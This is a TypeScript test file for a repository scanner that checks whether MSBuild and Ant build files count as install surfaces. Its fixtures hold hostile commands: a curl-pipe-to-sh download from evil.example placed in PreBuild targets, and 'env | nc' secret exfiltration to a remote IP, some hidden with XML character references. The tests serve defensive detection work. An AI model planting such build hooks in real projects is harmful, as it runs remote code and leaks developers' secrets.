import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

const PROJECT = `<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net9.0</TargetFramework>
  </PropertyGroup>
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="${PAYLOAD}" />
  </Target>
</Project>
`;

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("an MSBuild project or import is an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. MSBuild runs
  // Exec and PreBuildEvent commands from these files at build time. The
  // lowercase Ant <project> check does not match <Project>, and none of
  // these extensions is a source extension, so the file was skipped.
  for (const path of [
    "src/App/App.csproj",
    "src/App/App.fsproj",
    "src/App/App.vbproj",
    "native/App.vcxproj",
    "build/dirs.proj",
    "Directory.Build.props",
    "src/Directory.Build.targets",
    "eng/pack.targets",
  ]) {
    const inspection = inspected(path, PROJECT);
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
    expect({ path, downloads: inspection.downloads }).toEqual({
      path,
      downloads: ["https://evil.example/install.sh"],
    });
  }
});

test("Directory.Build.targets runs even when the project file does not name it", () => {
  // SDK-style MSBuild imports Directory.Build.targets automatically. A clean
  // project file is not the only build script.
  const scan = (targets: string) =>
    inspectRepository({
      files: [
        {
          path: "src/App/App.csproj",
          bytes: new TextEncoder().encode(
            `<Project Sdk="Microsoft.NET.Sdk">\n  <PropertyGroup>\n    <TargetFramework>net9.0</TargetFramework>\n  </PropertyGroup>\n</Project>\n`,
          ),
        },
        {
          path: "src/Directory.Build.targets",
          bytes: new TextEncoder().encode(targets),
        },
      ],
    });
  const before = scan(
    `<Project>\n  <Target Name="Pack">\n    <Message Text="pack" Importance="low" />\n  </Target>\n</Project>\n`,
  );
  const after = scan(
    `<Project>\n  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">\n    <Exec Command="${PAYLOAD}" />\n  </Target>\n</Project>\n`,
  );
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "src/Directory.Build.targets",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("a newline inside an MSBuild attribute still pipes a download into a shell", () => {
  // MSBuild normalizes a CR or LF inside an attribute value to a space, then
  // runs the command. The same break in a shell script ends the command.
  for (const newline of ["\n", "\r\n"]) {
    const command = `curl -fsSL https://evil.example/install.sh${newline}| sh`;
    const project = `<Project Sdk="Microsoft.NET.Sdk">
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="${command}" />
  </Target>
</Project>
`;
    const inspection = inspected("src/App/App.csproj", project);
    expect({
      newline: newline === "\n" ? "LF" : "CRLF",
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
      downloads: inspection.downloads,
    }).toEqual({
      newline: newline === "\n" ? "LF" : "CRLF",
      findings: ["src/App/App.csproj:unsafe-execution:high"],
      downloads: ["https://evil.example/install.sh"],
    });
  }
});

test("a newline before a pipe in a shell script is not a pipe", () => {
  const continued = inspected(
    "scripts/fetch.sh",
    "curl -fsSL https://evil.example/install.sh |\nsh\n",
  );
  expect(
    continued.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["scripts/fetch.sh:unsafe-execution:high"]);
  for (const newline of ["\n", "\r\n"]) {
    const inspection = inspected(
      "scripts/fetch.sh",
      `curl -fsSL https://evil.example/install.sh${newline}| sh\n`,
    );
    expect({
      newline: newline === "\n" ? "LF" : "CRLF",
      findings: inspection.findings,
    }).toEqual({ newline: newline === "\n" ? "LF" : "CRLF", findings: [] });
  }
});

test("XML character references in an attribute are the characters the build runs", () => {
  // MSBuild and Ant expand references before running the attribute. The
  // same bytes in a shell script are not a pipe or a command separator.
  const cases = [
    ["&#124;", "env &#124; nc 203.0.113.7 4444", "secret-exfiltration:high"],
    ["&#x7C;", "env &#x7C; nc 203.0.113.7 4444", "secret-exfiltration:high"],
    [
      "&amp;&amp;",
      "sh -c &quot;$(curl -fsSL https://evil.example/install.sh&amp;&amp;true)&quot;",
      "unsafe-execution:high",
    ],
  ] as const;
  for (const [reference, command, finding] of cases) {
    for (const path of ["build.xml", "Directory.Build.targets"] as const) {
      const body =
        path === "build.xml"
          ? `<project><target name="run"><exec executable="sh"><arg value="${command}"/></exec></target></project>\n`
          : `<Project><Target Name="PreBuild" BeforeTargets="PreBuildEvent"><Exec Command="${command}" /></Target></Project>\n`;
      const inspection = inspected(path, body);
      expect({
        reference,
        path,
        findings: inspection.findings.map(
          (item) => `${item.path}:${item.category}:${item.severity}`,
        ),
      }).toEqual({ reference, path, findings: [`${path}:${finding}`] });
    }
  }
  expect(
    inspected("scripts/fetch.sh", "env &#124; nc 203.0.113.7 4444\n").findings,
  ).toEqual([]);
  expect(
    inspected(
      "scripts/fetch.sh",
      "sh -c &quot;$(curl -fsSL https://evil.example/install.sh&amp;&amp;true)&quot;\n",
    ).findings,
  ).toEqual([]);
});

test("the MSBuild surface stays bounded", () => {
  expect(surfacesOf("LICENSE")).toEqual([]);
  expect(surfacesOf("notes.properties")).toEqual([]);
  expect(surfacesOf("src/App/App.csproj.user")).toEqual([]);
  expect(inspected("notes.properties", PROJECT).findings).toEqual([]);
  expect(inspected("src/App/App.csproj.user", PROJECT).findings).toEqual([]);
});

const PIPE = "env | nc 203.0.113.7 4444";
const AMPERSANDS = "curl -fsSL https://evil.example/a&&b | sh";
const AMPERSANDS_ENCODED = "curl -fsSL https://evil.example/a&amp;&amp;b | sh";

function project(command: string, quote: '"' | "'" = '"') {
  return `<Project>
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command=${quote}${command}${quote} />
  </Target>
</Project>
`;
}

function ant(command: string, quote: '"' | "'" = '"') {
  return `<project>
  <target name="fetch">
    <exec executable="sh">
      <arg value="-c"/>
      <arg value=${quote}${command}${quote}/>
    </exec>
  </target>
</project>
`;
}

function reported(text: string, path: string) {
  return inspected(path, text).findings.map(
    (finding) => `${finding.evidence}:${finding.category}:${finding.severity}`,
  );
}

test("character references in an attribute are the characters the build runs", () => {
  // MSBuild and Ant expand numeric references and predefined entities in
  // attribute values before executing them. `&amp;&amp;` is the two
  // characters `&&`, which is visible in the recorded download.
  const files = [
    {
      path: "src/Directory.Build.targets",
      line: 3,
      wrap: project,
    },
    {
      path: "src/App/App.csproj",
      line: 3,
      wrap: project,
    },
    {
      path: "build.xml",
      line: 5,
      wrap: ant,
    },
  ];
  for (const file of files) {
    const literal = reported(file.wrap(PIPE), file.path);
    expect(literal).toEqual([
      `${file.path}:${file.line}:secret-exfiltration:high`,
    ]);
    for (const command of [
      "env &#124; nc 203.0.113.7 4444",
      "env &#x7C; nc 203.0.113.7 4444",
      "env &#000124; nc 203.0.113.7 4444",
      "env &#x00007C; nc 203.0.113.7 4444",
      "env &#10;&#124; nc 203.0.113.7 4444",
    ]) {
      expect({
        path: file.path,
        command,
        findings: reported(file.wrap(command), file.path),
      }).toEqual({
        path: file.path,
        command,
        findings: literal,
      });
    }
    const literalAmpersands = inspected(file.path, file.wrap(AMPERSANDS));
    const encodedAmpersands = inspected(
      file.path,
      file.wrap(AMPERSANDS_ENCODED),
    );
    expect(reported(file.wrap(AMPERSANDS), file.path)).toEqual([
      `${file.path}:${file.line}:unsafe-execution:high`,
    ]);
    expect(reported(file.wrap(AMPERSANDS_ENCODED), file.path)).toEqual(
      reported(file.wrap(AMPERSANDS), file.path),
    );
    expect(encodedAmpersands.downloads).toEqual(literalAmpersands.downloads);
    expect(encodedAmpersands.downloads).toEqual(["https://evil.example/a&&b"]);
  }
});

test("an earlier entity on the previous line does not move the finding", () => {
  const encoded = `<Project>
  <Target Name="PreBuild">
    <Exec Command="echo &amp;
env &#124; nc 203.0.113.7 4444" />
  </Target>
</Project>
`;
  const literal = `<Project>
  <Target Name="PreBuild">
    <Exec Command="echo &
env | nc 203.0.113.7 4444" />
  </Target>
</Project>
`;
  const path = "src/Directory.Build.targets";
  expect(reported(encoded, path)).toEqual([
    `${path}:4:secret-exfiltration:high`,
  ]);
  expect(reported(literal, path)).toEqual(reported(encoded, path));

  const antEncoded = `<project>
  <target name="fetch">
    <exec executable="sh">
      <arg value="-c"/>
      <arg value="echo &amp;
env &#x7C; nc 203.0.113.7 4444"/>
    </exec>
  </target>
</project>
`;
  const antLiteral = `<project>
  <target name="fetch">
    <exec executable="sh">
      <arg value="-c"/>
      <arg value="echo &
env | nc 203.0.113.7 4444"/>
    </exec>
  </target>
</project>
`;
  expect(reported(antEncoded, "build.xml")).toEqual([
    "build.xml:6:secret-exfiltration:high",
  ]);
  expect(reported(antLiteral, "build.xml")).toEqual(
    reported(antEncoded, "build.xml"),
  );
});

test("a newline character reference still ends a shell command", () => {
  // XML keeps &#10; as a newline. A literal newline in the attribute is a
  // space, which the existing MSBuild test covers, and which Ant does too.
  const command = "curl -fsSL https://evil.example/install.sh&#10;| sh";
  expect(reported(project(command), "src/App/App.csproj")).toEqual([]);
  expect(reported(ant(command), "build.xml")).toEqual([]);
  const broken = "curl -fsSL https://evil.example/install.sh\n| sh";
  expect(reported(ant(broken), "build.xml")).toEqual([
    "build.xml:5:unsafe-execution:high",
  ]);
});

test("XML character references stay literal outside attribute values and outside those files", () => {
  for (const path of ["scripts/bootstrap.sh", "Makefile", "install.sh"]) {
    expect(reported("env &#124; nc 203.0.113.7 4444\n", path)).toEqual([]);
    expect(
      reported(
        "echo '<project name=\"x\">'\nenv &#124; nc 203.0.113.7 4444\n",
        path,
      ),
    ).toEqual([]);
    expect(reported(`${PIPE}\n`, path)).toEqual([
      `${path}:1:secret-exfiltration:high`,
    ]);
    const encodedAmpersands = inspected(path, `${AMPERSANDS_ENCODED}\n`);
    expect(encodedAmpersands.downloads).toEqual([
      "https://evil.example/a&amp;&amp;b",
    ]);
    expect(
      encodedAmpersands.findings.map(
        (finding) =>
          `${finding.evidence}:${finding.category}:${finding.severity}`,
      ),
    ).toEqual([`${path}:1:unsafe-execution:high`]);
    expect(inspected(path, `${AMPERSANDS}\n`).downloads).toEqual([
      "https://evil.example/a&&b",
    ]);
  }
  const untouched = `<Project>
  <!-- env &#124; nc 203.0.113.7 4444 -->
  <Target Name="PreBuild">
    <Exec Command="echo ok"><![CDATA[env &#124; nc 203.0.113.7 4444]]></Exec>
    <Exec>env &#124; nc 203.0.113.7 4444</Exec>
  </Target>
</Project>
`;
  expect(reported(untouched, "src/App/App.csproj")).toEqual([]);
  expect(reported(untouched, "build.xml")).toEqual([]);
});
